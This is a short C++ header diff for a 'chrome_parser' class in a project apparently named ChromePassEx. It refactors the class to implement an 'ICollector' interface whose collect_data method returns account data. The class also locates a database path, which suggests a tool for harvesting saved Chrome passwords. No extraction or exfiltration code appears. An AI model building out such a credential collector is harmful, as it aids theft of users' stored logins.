@@ -5,6 +5,7 @@
 #include <vector>
 
 #include "Forwards.h"
+#include "ICollector.h"
 
 #ifdef ChromePassEx_EXPORTS
 
@@ -26,13 +27,13 @@
 
 
 
-class EXPORT_F chrome_parser
+class EXPORT_F chrome_parser : public ICollector
 {
 public:
 	chrome_parser() = default;
 	~chrome_parser() = default;
 
-	bool try_parse_chrome(List<AccountData>& out_data);
+	List<AccountData> collect_data() override;
 	
 private:
 	bool get_path_to_db();
